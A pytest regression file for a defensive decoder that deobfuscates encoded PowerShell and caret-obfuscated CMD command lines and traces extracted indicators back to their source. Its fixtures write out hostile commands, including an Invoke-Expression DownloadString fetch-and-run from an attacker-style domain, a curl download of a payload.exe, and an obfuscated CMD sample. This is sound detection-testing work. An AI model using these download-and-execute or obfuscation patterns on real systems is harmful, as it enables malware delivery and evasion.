"""Decoder-in-Pipeline plumbing — regression coverage.

Invariants pinned:
  · Reuses the EXISTING `peel_recursively` engine — no new decoder code.
  · Every decoded layer is a canonical CHILD with provenance.decoded_from
    pointing back at the parent evidence id.
  · Decoded IOCs carry provenance back to the layer that produced them.
  · `attck_promotion=False` baked into both layer and IOC provenance
    — decoding is EVIDENCE, never a verdict.
  · No evidence → no claim: benign non-obfuscated inputs produce
    empty layers, not fabricated ones.
"""
from __future__ import annotations

import base64
import pytest

from services.decoder_bridge import (
    CanonicalDecodedLayer,
    decode_commandline,
    project_iocs,
    has_progress,
)


PARENT = "canonical:evt-42"


# ─── engine reuse ──────────────────────────────────────────────────
def test_decode_commandline_no_op_on_empty_input():
    final, layers = decode_commandline("", PARENT)
    assert final == ""
    assert layers == []


def test_benign_input_produces_no_layers():
    """No evidence → no claim.  A plain benign command must NOT
    yield fabricated decoded layers."""
    final, layers = decode_commandline("dir C:\\Users", PARENT)
    assert final == "dir C:\\Users"
    assert layers == []
    assert has_progress(layers) is False


# ─── multi-stage encoded PowerShell ────────────────────────────────
def test_powershell_encodedcommand_utf16_produces_child_layer():
    inner = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://tommy-aa.lol/f')"
    b64   = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
    cmd   = f"powershell -NoProfile -EncodedCommand {b64}"
    final, layers = decode_commandline(cmd, PARENT)
    assert layers, "expected at least one decoded layer"
    assert has_progress(layers) is True
    # Final payload must contain the inner (deobfuscated) content
    assert "DownloadString" in final
    assert "http://tommy-aa.lol/f" in final
    # Every layer must be a canonical CHILD of PARENT with correct provenance
    for lyr in layers:
        assert isinstance(lyr, CanonicalDecodedLayer)
        assert lyr.parent_id == PARENT
        assert lyr.provenance["decoded_from"]     == PARENT
        assert lyr.provenance["engine"]           == \
            "services.die.preprocessor.recursive_decoder"
        assert lyr.provenance["attck_promotion"]  is False
        assert lyr.canonical_id.startswith(f"{PARENT}::decoded[")


# ─── IOC projection with provenance ────────────────────────────────
def test_project_iocs_stamps_provenance_back_to_layer():
    inner = "curl http://tommy-aa.lol/payload.exe"
    b64   = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
    cmd   = f"powershell -NoP -Enc {b64}"
    _final, layers = decode_commandline(cmd, PARENT)
    iocs = project_iocs(layers)
    if not iocs:
        pytest.skip("existing IOC extractor did not surface IOCs "
                                "on this fixture — extractor contract, not "
                                "plumbing, is under test elsewhere")
    for ioc in iocs:
        prov = ioc["provenance"]
        assert prov["decoded_from"]     == PARENT
        assert prov["decoded_layer_id"].startswith(f"{PARENT}::decoded[")
        assert prov["attck_promotion"]  is False


# ─── deterministic: same input → same layer structure ─────────────
def test_decode_commandline_is_deterministic_structurally():
    inner = "Invoke-Expression \"whoami /priv\""
    b64   = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
    cmd   = f"powershell -EncodedCommand {b64}"
    f1, l1 = decode_commandline(cmd, "p1")
    f2, l2 = decode_commandline(cmd, "p2")   # different parent id
    assert f1 == f2
    assert len(l1) == len(l2)
    for a, b in zip(l1, l2):
        assert a.stage       == b.stage
        assert a.bytes_in    == b.bytes_in
        assert a.bytes_out   == b.bytes_out
        assert a.layer_index == b.layer_index


# ─── the owner-supplied obfuscated CMD sample ─────────────────────
def test_owner_supplied_obfuscated_cmd_sample():
    """Owner-supplied regression fixture — a caret-normalised URL
    inside a wildcard-executable-resolved command.  The recursive
    decoder is a COMMAND-LANGUAGE deobfuscator for this shape via
    its PS-normaliser stages; when no traditional decoder fires we
    must honestly report zero layers rather than fabricate one."""
    sample = (
        r"set q8k3=where c*d.e?e"
        "\n"
        r"h^t^t^p^s^:^/^/^t^o^m^m^y^-^a^a^.^l^o^l^/f"
    )
    final, layers = decode_commandline(sample, PARENT)
    # Honest-state invariant: if no codec-class decoder makes
    # progress, layers may be empty.  What must NEVER happen is a
    # crash or fabricated layer.
    assert isinstance(final, str)
    for lyr in layers:
        assert lyr.parent_id == PARENT
        assert lyr.provenance["attck_promotion"] is False


# ─── canonical child ID uniqueness ────────────────────────────────
def test_canonical_ids_are_unique_across_layers():
    inner = "Invoke-Expression (New-Object Net.WebClient).DownloadString('http://a.b/c')"
    b64   = base64.b64encode(inner.encode("utf-16le")).decode("ascii")
    _, layers = decode_commandline(f"powershell -Enc {b64}", PARENT)
    ids = [l.canonical_id for l in layers]
    assert len(ids) == len(set(ids)), "canonical ids must be unique"
